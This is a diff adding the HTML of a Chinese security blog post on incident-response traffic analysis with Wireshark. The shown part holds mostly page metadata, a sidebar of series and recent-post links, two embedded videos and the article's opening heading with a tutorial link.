@@ -1,0 +1,1105 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>应急响应之Wireshark流量分析 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 24.33K                代码: 7.43K, 文本: 4.96K               预计阅读时间: 54 分钟                                                                 Wireshark基本使用https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zichliang&#x2F;p&#x2F;17477">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应之Wireshark流量分析">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/07/04/dd58c5ed/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 24.33K                代码: 7.43K, 文本: 4.96K               预计阅读时间: 54 分钟                                                                 Wireshark基本使用https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zichliang&#x2F;p&#x2F;17477">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911187.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911177.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911656.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911276.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911715.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911256.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911075.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911461.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911887.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911988.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911385.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911285.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912279.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912722.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912195.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912097.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912660.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912724.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912970.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912673.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231921446.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912125.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912112.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912873.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912902.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913181.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913422.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913916.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913657.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913558.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913104.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913302.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913907.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913430.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913900.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913191.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913495.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913612.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913762.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913464.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913534.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913847.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913775.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914538.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914126.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914560.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914904.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914124.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914725.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914066.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914488.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914933.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914357.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914428.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914302.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914445.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252352679.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353133.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353293.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353486.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353319.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353551.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353647.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053145.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053653.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529924.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529969.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529801.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529818.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054632.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054324.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054979.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054929.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054240.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054382.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425614.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425917.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426661.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426324.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426028.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426823.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426119.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426891.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427171.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427470.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427660.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427513.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535149.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636985.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535440.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636495.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535310.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636122.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535607.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021939.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021084.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242022904.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242027433.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242029927.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031588.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031647.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242032000.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242033231.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242034441.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242035170.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242036349.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242037431.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242019878.png">
+<meta property="article:published_time" content="2024-07-04T10:34:49.000Z">
+<meta property="article:modified_time" content="2024-10-17T02:14:24.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="流量分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911187.png">
+  
+  
+  
+  <meta name="keywords" content="应急响应,流量分析">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：EmergencyResponse</span></div><div class="widget-body"><a class="item" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item active" href="/2024/07/04/dd58c5ed/"><span class="title">应急响应之Wireshark流量分析</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item" href="/2024/07/06/9e820566/"><span class="title">应急响应之日志分析</span></a><a class="item" href="/2024/07/07/4677b70c/"><span class="title">应急响应之Splunk</span></a><a class="item" href="/2024/07/08/b7b8d727/"><span class="title">应急响应之Windows</span></a><a class="item" href="/2024/07/09/69563a36/"><span class="title">应急响应靶机训练-Web1</span></a><a class="item" href="/2024/07/10/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item" href="/2024/07/11/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item" href="/2024/07/12/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item" href="/2024/07/16/29554557/"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item" href="/2024/07/17/b05c14ed/"><span class="title">应急响应靶机训练-Linux2</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/07/03/ac635236/">EmergencyResponse</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-04T10:34:49.000Z">2024-07-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-17T02:14:24.000Z">2024-10-17</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>应急响应之Wireshark流量分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 24.33K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 7.43K, 文本: 4.96K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 54 分钟</p>
+    </div>
+    </div>
+
+
+    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">
+    <iframe src="https://player.bilibili.com/player.html?bvid=BV15R2UYWED2&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">
+    </iframe>
+    </div>
+    
+
+    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">
+    <iframe src="https://player.bilibili.com/player.html?bvid=BV16amNYVE22&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">
+    </iframe>
+    </div>
+    
+
+<h2 id="Wireshark基本使用"><a href="#Wireshark基本使用" class="headerlink" title="Wireshark基本使用"></a>Wireshark基本使用</h2><div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://www.cnblogs.com/zichliang/p/17477251.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://www.cnblogs.com/zichliang/p/17477251.html</span></div><div class="bottom"><span class="title">https://www.cnblogs.com/zichliang/p/17477251.html</span><span class="cap desc footnote"></span></div></a></div>
+
